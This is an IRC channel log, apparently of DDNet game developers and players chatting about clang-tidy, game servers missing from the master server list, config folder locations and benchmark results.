21:01 < bridge_> <Solly (bun bun)> where is spec position stored?
21:01 < bridge_> <Solly (bun bun)> for freeview
21:04 < bridge_> <Solly (bun bun)> (https://github.com/ddnet/ddnet/pull/10026 merge this plz)
21:09 < bridge_> <chairn> <https://en.wikipedia.org/wiki/1995_Greater_Pittsburgh_bank_robberies>
21:37 < bridge_> <Ewan> > The robberies directly inspired the research of the Dunning–Kruger effect
21:37 < bridge_> <Ewan> yeah….
21:38 < bridge_> <Assa> at least they are no robbytteries
21:38 < bridge_> <Assa> yeah yeah, I'll move into the shame corner
21:39 < bridge_> <kebscs> how do i run clang tidy on cmake project so it shows me all the warnings?
21:39 < bridge_> <kebscs> with visual studio
21:40 < bridge_> <Ewan> tools >developer command prompt> clang-tidy -*
21:40 < bridge_> <Ewan> :greenthing:
21:46 < bridge_> <kebscs> ty will look how to make it work
21:58 < bridge_> <kebscs> ok i have to do it for every file individually but works
21:58 < bridge_> <kebscs> not a big project so dont mind
22:03 < ws-client> <ChillerDragon> @0xdeen do you know why 45.142.178.158:8304 and tw-0.7+udp://45.142.178.158:8704 do not show up in the ddnet master anymore? They used to work for years i changed nothing. Same vps still has other servers registered successfully
22:03 < ws-client> <ChillerDragon> and the 0.7 server also shows up in the teeworlds vanilla client
22:26 < bridge_> <Teero> @totar discord isn't working but the \_\_bultin\_expect made it worse xd
22:28 < ws-client> <ChillerDragon> i have the feeling more than just my vanilla servers are affected
22:28 < bridge_> <Jupstar ✪> chiller
22:28 < bridge_> <Jupstar ✪> why u ignore invite
22:28 < bridge_> <Teero> yea
22:28 < ws-client> <ChillerDragon> try searching zcatch
22:28 < ws-client> <ChillerDragon> i find only one server
22:29 < ws-client> <ChillerDragon> which invite @Jupstar ✪ 
22:29 < bridge_> <Jupstar ✪> matrix
22:29 < bridge_> <Jupstar ✪> Teero: do you also see the double ping in matrix?
22:29 < ws-client> <ChillerDragon> matrix sucks
22:30 < bridge_> <Teero> yes
22:30 < bridge_> <Jupstar ✪> weird bug
22:30 < bridge_> <Jupstar ✪> in discord it's like this
22:30 < bridge_> <Jupstar ✪> https://cdn.discordapp.com/attachments/293493549758939136/1359988892345827601/image.png?ex=67f97bdb&is=67f82a5b&hm=a930c4cbaf597ec5994b9f31aae11b647309f3fae0e39f9ffde2dade88a59268&
22:30 < bridge_> <Teero> hmm
22:30 < bridge_> <Teero> discord is down for me
22:30 < bridge_> <Teero> i can't get in
22:30 < bridge_> <Jupstar ✪> it was down earlier today for me
22:31 < ws-client> <ChillerDragon> https://zillyhuhn.com/cs/.1744317082.png
22:31 < ws-client> <ChillerDragon> i got no permissions to do nothing there
22:31 < ws-client> <ChillerDragon> go add irc bridge
22:31 < ws-client> <ChillerDragon> matrix is ass
22:32 < bridge_> <Jupstar ✪> true
22:32 < bridge_> <Jupstar ✪> but so is discord and irc
22:32 < ws-client> <ChillerDragon> no irc is good
22:32 < bridge_> <Jupstar ✪> teeworlds ingame chat bridge
22:35 < bridge_> <TsFredium> I figured I should show up once a while just to pretend I'm still dev.
22:35 < bridge_> <TsFredium> Ok back to sleep now
22:37 < bridge_> <Teero> maybe the invite is so old xd
22:37 < bridge_> <Teero> wait
22:38 < bridge_> <Teero> no, chiller join a room xd
22:38 < ws-client> <ChillerDragon> already closed shittrix
22:38 < ws-client> <ChillerDragon> will check again when im bored on my phone
22:38 < bridge_> <Teero> bruh :(
22:39 < bridge_> <Teero> oke
22:39 < bridge_> <Teero> i won't come to your next kitchen meetup then!
22:39 < ws-client> <ChillerDragon> using matrix on desktop is painful
22:39 < ws-client> <ChillerDragon> you didnt come to last either
22:39 < ws-client> <ChillerDragon> watafak
22:39 < bridge_> <Teero> xdd
22:39 < bridge_> <Teero> it was too long to walk
22:39 < ws-client> <ChillerDragon> fair
22:39 < furo> ChillerDragon: The 0.6/0.7 master to HTTP master bridge probably broke, I guess
22:39 < ws-client> <ChillerDragon> i still see some vanilla servers
22:40 < ws-client> <ChillerDragon> for example  ÆON tw-0.7+udp://46.101.195.242:8308
22:41 < ws-client> <ChillerDragon> i have to say so far i appreciate the outage a lot
22:41 < ws-client> <ChillerDragon> if players search for zCatch now they only find my server and nothing else
22:45 < bridge_> <dope0> https://discord.com/channels/252358080522747904/342454474117218334/1359992576547098674 pls answer
22:46 < bridge_> <TsFredium> It is the same as regular client. Through %appdata%. No steam cloud save support
22:47 < bridge_> <dope0> thank you very much 🙂
22:47 < bridge_> <TsFredium> :heartw:
22:47 < bridge_> <dope0> teeworlds dir right?
22:48 < bridge_> <TsFredium> It's called ddnet now
22:48 < bridge_> <dope0> but its still teeworlds on mine device tho apparently
22:48 < bridge_> <dope0> have got no ddnet
22:48 < bridge_> <TsFredium> Possibly? That part I'm not so sure about
22:49 < bridge_> <dope0> i played on nonsteam version earlier so maybe thats the cause
22:49 < bridge_> <dope0> coz i see ddnet files inside
22:49 < bridge_> <dope0> with recent modified date
22:49 < bridge_> <TsFredium> Then maybe.
22:50 < bridge_> <dope0> oh shit its 16gb
22:50 < bridge_> <dope0> wtf
22:50 < bridge_> <TsFredium> Ye demos
22:50 < furo> Yes, it will be `teeworlds` if you were playing before the rename. If you were to start over, it would be named `ddnet` instead.
22:50 < bridge_> <dope0> ah right
22:51 < bridge_> <TsFredium> I honestly thought we would duplicate it as a migration if there was a teeworlds/ddnet-settings.cfg.  I just assumed.
22:51 < bridge_> <TsFredium> :justatest:
22:52 < bridge_> <teero777> ```
22:52 < bridge_> <teero777> Benchmarking in single-threaded mode...
22:52 < bridge_> <teero777> TPS (mean ± σ):        7,001,091 ± 848 ticks/s
22:52 < bridge_> <teero777> Range (min … max):    6,999,909 … 7,002,882 ticks/s    10 runs
22:52 < bridge_> <teero777> ```
22:52 < bridge_> <teero777> :DDDDDD
22:53 < bridge_> <Jupstar ✪> +- 848 is consistent
23:07 < bridge_> <Teero> I got another 30k from a bultin assume :P didn't actually expect them to do much
23:58 < bridge_> <gabbcs> monster show in 0.6 but teeware doesn't, but everything seems ok in the two consoles
23:59 < bridge_> <gabbcs> but even that monster shows in 0.6, it doesnt show in ddnet
